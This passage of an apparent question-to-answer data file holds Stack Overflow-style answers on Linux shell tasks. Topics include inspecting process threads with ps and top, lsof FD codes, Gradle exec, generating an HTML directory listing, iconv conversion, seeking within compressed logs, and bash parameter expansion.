2160  2876  2161 99    4 15:22 pts/39   Rl+    0:14 ./puma\nkvantour  2160  2876  2162 99    4 15:22 pts/39   Rl+    0:14 ./puma\nkvantour  2160  2876  2163 99    4 15:22 pts/39   Rl+    0:14 ./puma\nhowever, adding the -m option clearly gives a nicer overview. This is especially handy when multiple processes are running with the same name.\n% ps -fmL $(pgrep puma)\nUID        PID  PPID   LWP  C NLWP STIME TTY      STAT   TIME CMD\nkvantour  2160  2876     -  0    4 15:22 pts/39   -      0:44 ./puma\nkvantour     -     -  2160  0    - 15:22 -        Sl+    0:00 -     \nkvantour     -     -  2161 99    - 15:22 -        Rl+    0:14 -     \nkvantour     -     -  2162 99    - 15:22 -        Rl+    0:14 -     \nkvantour     -     -  2163 99    - 15:22 -        Rl+    0:14 -     \nIn this example, you see that process puma with PID 2160 runs with 4 threads (NLWP) having the ID's 2160--2163. Under STAT you see two different values Sl+ and 'Rl+'. Here the l is an indicator for multi-threaded. S and R stand for interruptible sleep (waiting for an event to complete) and respectively running. So we see that 3 of the 4 threads are running at 99% CPU and one thread is sleeping. You also see the total accumulated CPU time (44s) while a single thread only runs for 14s.\nAnother way to obtain information is by directly using the format specifiers with -o or -O.\nman ps :: STANDARD FORMAT SPECIFIERS\n   lwp    lightweight process (thread) ID of the dispatchable\n          entity (alias spid, tid).  See tid for additional\n          information.  Show threads as if they were processes.\n   nlwp   number of lwps (threads) in the process.  (alias thcount).\nSo you can use any of lwp,spid or tid and nlwp or thcount.\nIf you only want to get the number of threads of a process called puma, you can use :\n% ps -o nlwp $(pgrep puma)\nNLWP\n   4\nor if you don't like the header\n% ps -h -o nlwp $(pgrep puma)\n   4\nYou can get a bit more information with :\n% ps -O nlwp $(pgrep puma)\nPID   NLWP S TTY          TIME COMMAND\n19304    4 T pts/39   00:00:00 ./puma\nFinally, you can combine the flags with ps aux to list the threads.\n % ps aux -L\nUSER       PID   LWP %CPU NLWP %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\n...\nkvantour  1618  1618  0.0    4  0.0  33260  1436 pts/39   Sl+  15:17   0:00 ./puma\nkvantour  1618  1619 99.8    4  0.0  33260  1436 pts/39   Rl+  15:17   0:14 ./puma\nkvantour  1618  1620 99.8    4  0.0  33260  1436 pts/39   Rl+  15:17   0:14 ./puma\nkvantour  1618  1621 99.8    4  0.0  33260  1436 pts/39   Rl+  15:17   0:14 ./puma\n...\nCan top show information about threads or LWP's?\ntop has the option to show threads by hitting H in the interactive mode or by launching top with top -H. The problem is that it lists the threads as processes (similar to ps -fH).\n% top\ntop - 09:42:10 up 17 days, 3 min,  1 user,  load average: 3.35, 3.33, 2.75\nTasks: 353 total,   3 running, 347 sleeping,   3 stopped,   0 zombie\n%Cpu(s): 75.5 us,  0.6 sy,  0.5 ni, 22.6 id,  0.0 wa,  0.0 hi,  0.8 si,  0.0 st\nKiB Mem : 16310772 total,  8082152 free,  3662436 used,  4566184 buff/cache\nKiB Swap:  4194300 total,  4194300 free,        0 used. 11363832 avail Mem \n\n  PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND\n  868 kvantour  20   0   33268   1436   1308 S 299.7  0.0  46:16.22 puma\n 1163 root      20   0  920488 282524 258436 S   2.0  1.7 124:48.32 Xorg\n ...\nHere you see that puma runs at about 300% CPU for an accumulated time of 46:16.22. There is, however, no indicator that this is a threaded process. The only indicator is the CPU usage, however, this could be below 100% if 3 threads are \"sleeping\"? Furthermore, the status flag states S which indicates that the first thread is asleep. Hitting H give you then\n% top -H\ntop - 09:48:30 up 17 days, 10 min,  1 user,  load average: 3.18, 3.44, 3.02\nThreads: 918 total,   5 running, 910 sleeping,   3 stopped,   0 zombie\n%Cpu(s): 75.6 us,  0.2 sy,  0.1 ni, 23.9 id,  0.0 wa,  0.0 hi,  0.2 si,  0.0 st\nKiB Mem : 16310772 total,  8062296 free,  3696164 used,  4552312 buff/cache\nKiB Swap:  4194300 total,  4194300 free,        0 used. 11345440 avail Mem \n\n  PID USER      PR  NI    VIRT    RES    SHR S %CPU %MEM     TIME+ COMMAND\n  870 kvantour  20   0   33268   1436   1308 R 99.9  0.0  21:45.35 puma\n  869 kvantour  20   0   33268   1436   1308 R 99.7  0.0  21:45.43 puma\n  872 kvantour  20   0   33268   1436   1308 R 99.7  0.0  21:45.31 puma\n 1163 root      20   0  920552 282288 258200 R  2.0  1.7 124:52.05 Xorg \n  ...\nNow we see only 3 threads. As one of the Threads is \"sleeping\", it is way down the bottom as top sorts by CPU usage.\nIn order to see all threads, it is best to ask top to display a specific pid (for a single process):\n% top -H -p $(pgrep puma)\ntop - 09:52:48 up 17 days, 14 min,  1 user,  load average: 3.31, 3.38, 3.10\nThreads:   4 total,   3 running,   1 sleeping,   0 stopped,   0 zombie\n%Cpu(s): 75.5 us,  0.1 sy,  0.2 ni, 23.6 id,  0.0 wa,  0.0 hi,  0.7 si,  0.0 st\nKiB Mem : 16310772 total,  8041048 free,  3706460 used,  4563264 buff/cache\nKiB Swap:  4194300 total,  4194300 free,        0 used. 11325008 avail Mem \n\n  PID USER      PR  NI    VIRT    RES    SHR S %CPU %MEM     TIME+ COMMAND\n  869 kvantour  20   0   33268   1436   1308 R 99.9  0.0  26:03.37 puma\n  870 kvantour  20   0   33268   1436   1308 R 99.9  0.0  26:03.30 puma\n  872 kvantour  20   0   33268   1436   1308 R 99.9  0.0  26:03.22 puma\n  868 kvantour  20   0   33268   1436   1308 S  0.0  0.0   0:00.00 puma\nWhen you have multiple processes running, you might be interested in hitting f and toggle PGRP on. This shows the Group PID of the process. (PID in ps where PID in top is LWP in ps).\nHow do I get the thread count without using ps or top?\nThe file /proc/$PID/status contains a line stating how many threads the process with PID $PID is using.\n% grep Threads /proc/19304/status\nThreads:        4\nGeneral comments\nIt is possible that you do not find the process of another user and therefore cannot get the number of threads that process is using. This could be due to the mount options of /proc/ (hidepid=2).\nUsed example program:\n#include <omp.h>\n#include <stdio.h>\n#include <stdlib.h>\n\nint main (int argc, char *argv[]) {\nchar c = 0;\n#pragma omp parallel shared(c)   {\n    int i = 0;\n    if (omp_get_thread_num() == 0) {\n      printf(\"Read character from input : \");\n      c = getchar();\n    } else {\n      while (c == 0) i++;\n      printf(\"Total sum is on thread %d : %d\\n\", omp_get_thread_num(), i);\n    }\n  }\n}\ncompiled with gcc -o puma --openmp",
    "What does the FD column of pipes listed by lsof mean?": "Files are not only opened as streams. Some of those are listed in lsof's manual:\nFD    is the File Descriptor number of the file or:\n\n           cwd  current working directory;\n           Lnn  library references (AIX);\n           err  FD information error (see NAME column);\n           jld  jail directory (FreeBSD);\n           ltx  shared library text (code and data);\n           Mxx  hex memory-mapped type number xx.\n           m86  DOS Merge mapped file;\n           mem  memory-mapped file;\n           mmap memory-mapped device;\n           pd   parent directory;\n           rtd  root directory;\n           tr   kernel trace file (OpenBSD);\n           txt  program text (code and data);\n           v86  VP/ix mapped file;\n\n      FD  is  followed  by one of these characters, describing the\n      mode under which the file is open:\n\n           r for read access;\n           w for write access;\n           u for read and write access;\n           space if mode unknown and no lock\n            character follows;\n           '-' if mode unknown and lock\n            character follows.\n\n      The mode character is followed by one of these lock  charac-\n      ters, describing the type of lock applied to the file:\n\n           N for a Solaris NFS lock of unknown type;\n           r for read lock on part of the file;\n           R for a read lock on the entire file;\n           w for a write lock on part of the file;\n           W for a write lock on the entire file;\n           u for a read and write lock of any length;\n           U for a lock of unknown type;\n           x  for an SCO OpenServer Xenix lock on part  of the\n      file;\n           X for an SCO OpenServer Xenix lock on  the   entire\n      file;\n           space if there is no lock.\n\n      See  the  LOCKS  section  for  more  information on the lock\n      information character.\n\n      The FD column contents constitutes a single field for  pars-\n      ing in post-processing scripts.",
    "Run shell command in gradle but NOT inside a task": "You can do something like the following:\ndef doMyThing(String target) {\n    exec {\n        executable \"something.sh\"\n        args \"-t\", target\n    }\n}\n\ntask doIt {\n    doLast {\n        doMyThing(\"/tmp/foo\")\n        doMyThing(\"/tmp/gee\")\n    }\n}\nThe exec here is not a task, it's the Project.exec() method.",
    "shell script to create a static HTML directory listing": "#!/bin/bash\n\nROOT=/tmp/test\nHTTP=\"/\"\nOUTPUT=\"_includes/site-index.html\" \n\ni=0\necho \"<UL>\" > $OUTPUT\nfor filepath in `find \"$ROOT\" -maxdepth 1 -mindepth 1 -type d| sort`; do\n  path=`basename \"$filepath\"`\n  echo \"  <LI>$path</LI>\" >> $OUTPUT\n  echo \"  <UL>\" >> $OUTPUT\n  for i in `find \"$filepath\" -maxdepth 1 -mindepth 1 -type f| sort`; do\n    file=`basename \"$i\"`\n    echo \"    <LI><a href=\\\"/$path/$file\\\">$file</a></LI>\" >> $OUTPUT\n  done\n  echo \"  </UL>\" >> $OUTPUT\ndone\necho \"</UL>\" >> $OUTPUT\nMy /tmp/test\n/tmp/test\n\u251c\u2500\u2500 accidents\n\u2502   \u251c\u2500\u2500 accident2.gif\n\u2502   \u251c\u2500\u2500 accident3.gif\n\u2502   \u2514\u2500\u2500 accident4.gif\n\u251c\u2500\u2500 bears\n\u2502   \u251c\u2500\u2500 bears1.gif\n\u2502   \u251c\u2500\u2500 bears2.gif\n\u2502   \u251c\u2500\u2500 bears3.gif\n\u2502   \u2514\u2500\u2500 bears4.gif\n\u2514\u2500\u2500 cats\n    \u251c\u2500\u2500 cats1.gif\n    \u2514\u2500\u2500 cats2.gif\nThe resulting output\n<UL>\n  <LI>accidents</LI>\n  <UL>\n    <LI><a href=\"/accidents/accident2.gif\">accident2.gif</a></LI>\n    <LI><a href=\"/accidents/accident3.gif\">accident3.gif</a></LI>\n    <LI><a href=\"/accidents/accident4.gif\">accident4.gif</a></LI>\n  </UL>\n  <LI>bears</LI>\n  <UL>\n    <LI><a href=\"/bears/bears1.gif\">bears1.gif</a></LI>\n    <LI><a href=\"/bears/bears2.gif\">bears2.gif</a></LI>\n    <LI><a href=\"/bears/bears3.gif\">bears3.gif</a></LI>\n    <LI><a href=\"/bears/bears4.gif\">bears4.gif</a></LI>\n  </UL>\n  <LI>cats</LI>\n  <UL>\n    <LI><a href=\"/cats/cats1.gif\">cats1.gif</a></LI>\n    <LI><a href=\"/cats/cats2.gif\">cats2.gif</a></LI>\n  </UL>\n</UL>\nYou could expand the UL with href too, but I wasn't sure if that's what you wanted.\necho \"  <UL><a href=\\\"/$path\\\">$path</a>\" >> $OUTPUT\nYou would have to run this in the parent folder of _includes",
    "osx change file encoding (iconv) recursive": "Adam' comment showed me the way how to resolve it, but this was the only syntax I made it work:\nfind /mydisk/myfolder -name \\*.xxx -type f | \\\n    (while read file; do\n        iconv -f ISO-8859-1 -t UTF-8 \"$file\" > \"${file%.xxx}-utf8.xxx\";\n    done);\n-i ... -o ... doesnt work, but >\nthx again\nekke",
    "How to zgrep the last line of a gz file without tail": "The easiest solution would be to alter your log rotation to create smaller files.\nThe second easiest solution would be to use a compression tool that supports random access.\nProjects like dictzip, BGZF, and csio each add sync flush points at various intervals within gzip-compressed data that allow you to seek to in a program aware of that extra information. While it exists in the standard, the vanilla gzip does not add such markers either by default or by option.\nFiles compressed by these random-access-friendly utilities are slightly larger (by perhaps 2-20%) due to the markers themselves, but fully support decompression with gzip or another utility that is unaware of these markers.\nYou can learn more at this question about random access in various compression formats.\nThere's also a \"Blasted Bioinformatics\" blog by Peter Cock with several posts on this topic, including:\nBGZF - Blocked, Bigger & Better GZIP! \u2013 gzip with random access (like dictzip)\nRandom access to BZIP2? \u2013 An investigation (result: can't be done, though I do it below)\nRandom access to blocked XZ format (BXZF) \u2013 xz with improved random access support\nExperiments with xz\nxz (an LZMA compression format) actually has random access support on a per-block level, but you will only get a single block with the defaults.\nFile creation\nxz can concatenate multiple archives together, in which case each archive would have its own block. The GNU split can do this easily:\nsplit -b 50M --filter 'xz -c' big.log > big.log.sp.xz\nThis tells split to break big.log into 50MB chunks (before compression) and run each one through xz -c, which outputs the compressed chunk to standard output. We then collect that standard output into a single file named big.log.sp.xz.\nTo do this without GNU, you'd need a loop:\nsplit -b 50M big.log big.log-part\nfor p in big.log-part*; do xz -c $p; done > big.log.sp.xz\nrm big.log-part*\nParsing\nYou can get the list of block offsets with xz --verbose --list FILE.xz. If you want the last block, you need its compressed size (column 5) plus 36 bytes for overhead (found by comparing the size to hd big.log.sp0.xz |grep 7zXZ). Fetch that block using tail -c and pipe that through xz. Since the above question wants the last line of the file, I then pipe that through tail -n1:\nSIZE=$(xz --verbose --list big.log.sp.xz |awk 'END { print $5 + 36 }')\ntail -c $SIZE big.log.sp.xz |unxz -c |tail -n1\nSide note\nVersion 5.1.1 introduced support for the --block-size flag:\nxz --block-size=50M big.log\nHowever, I have not been able to extract a specific block since it doesn't include full headers between blocks. I suspect this is nontrivial to do from the command line.\nExperiments with gzip\ngzip also supports concatenation. I (briefly) tried mimicking this process for gzip without any luck. gzip --verbose --list doesn't give enough information and it appears the headers are too variable to find.\nThis would require adding sync flush points, and since their size varies on the size of the last buffer in the previous compression, that's too hard to do on the command line (use dictzip or another of the previously discussed tools).\nI did apt-get install dictzip and played with dictzip, but just a little. It doesn't work without arguments, creating a (massive!) .dz archive that neither dictunzip nor gunzip could understand.\nExperiments with bzip2\nbzip2 has headers we can find. This is still a bit messy, but it works.\nCreation\nThis is just like the xz procedure above:\nsplit -b 50M --filter 'bzip2 -c' big.log > big.log.sp.bz2\nI should note that this is considerably slower than xz (48 min for bzip2 vs 17 min for xz vs 1 min for xz -0) as well as considerably larger (97M for bzip2 vs 25M for xz -0 vs 15M for xz), at least for my test log file.\nParsing\nThis is a little harder because we don't have the nice index. We have to guess at where to go, and we have to err on the side of scanning too much, but with a massive file, we'd still save I/O.\nMy guess for this test was 50000000 (out of the original 52428800, a pessimistic guess that isn't pessimistic enough for e.g. an H.264 movie.)\nGUESS=50000000\nLAST=$(tail -c$GUESS big.log.sp.bz2 \\\n         |grep -abo 'BZh91AY&SY' |awk -F: 'END { print '$GUESS'-$1 }')\ntail -c $LAST big.log.sp.bz2 |bunzip2 -c |tail -n1\nThis takes just the last 50 million bytes, finds the binary offset of the last BZIP2 header, subtracts that from the guess size, and pulls that many bytes off of the end of the file. Just that part is decompressed and thrown into tail.\nBecause this has to query the compressed file twice and has an extra scan (the grep call seeking the header, which examines the whole guessed space), this is a suboptimal solution. See also the below section on how slow bzip2 really is.\n  Perspective\nGiven how fast xz is, it's easily the best bet; using its fastest option (xz -0) is quite fast to compress or decompress and creates a smaller file than gzip or bzip2 on the log file I was testing with. Other tests (as well as various sources online) suggest that xz -0 is preferable to bzip2 in all scenarios.\n            \u2014\u2014\u2014\u2014\u2014 No Random Access \u2014\u2014\u2014\u2014\u2014\u2014     \u2014\u2014\u2014\u2014\u2014\u2014\u2014 Random Access \u2014\u2014\u2014\u2014\u2014\u2014\u2014\nFORMAT       SIZE    RATIO   WRITE   READ      SIZE    RATIO   WRITE   SEEK\n\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014   \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014     \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\n(original)  7211M   1.0000       -   0:06     7211M   1.0000       -   0:00\nbzip2         96M   0.0133   48:31   3:15       97M   0.0134   47:39   0:00\ngzip          79M   0.0109    0:59   0:22                                  \ndictzip                                        605M   0.0839    1:36  (fail)\nxz -0         25M   0.0034    1:14   0:12       25M   0.0035    1:08   0:00\nxz            14M   0.0019   16:32   0:11       14M   0.0020   16:44   0:00\nTiming tests were not comprehensive, I did not average anything and disk caching was in use. Still, they look correct; there is a very small amount of overhead from split plus launching 145 compression instances rather than just one (this may even be a net gain if it allows an otherwise non-multithreaded utility to consume multiple threads).",
    "Rename file by removing last n characters": "You can remove a fixed number of characters using\nmv \"$file\" \"${file%???????}\"  # 7 question marks to match 7 characters\nThis will work in any POSIX-compliant shell.\nTo remove the last extension (which may be more or less than 7 characters), use\nmv \"$file\" \"${file%.*}\"\nTo trim everything after a given extension, you can try\nEXT=csv\nmv \"$file\" \"${file%.$EXT.*}\".$EXT\nwhich actually removes .$EXT and everything after, but then reattaches .$EXT.",
    "What does the ${-#*i} mean in shell script?": "$- means shell flags.\n${-#*i} means shell flags minus first match of *i.\nIf these two are not equal, then the shell is considered interactive (flag i is present).",
    "In a bash function, how do I get stdin into a variable": "input=$(cat) is a perfectly fine way to capture standard input if you really need to. One caveat is that command substitutions strip all trailing newlines, so if you want to make sure to capture those as well, you need to ensure that something aside from the newline(s) is read last.\ninput=$(cat; echo x)\ninput=${input%x}   # Strip the trailing x\nAnother option in bash 4 or later is to use the readarray command, which will populate an array with each line of standard input, one line per element, which you can then join back into a single variable if desired.\nreadarray foo\nprintf -v foo \"%s\" \"${foo[@]}\""
}
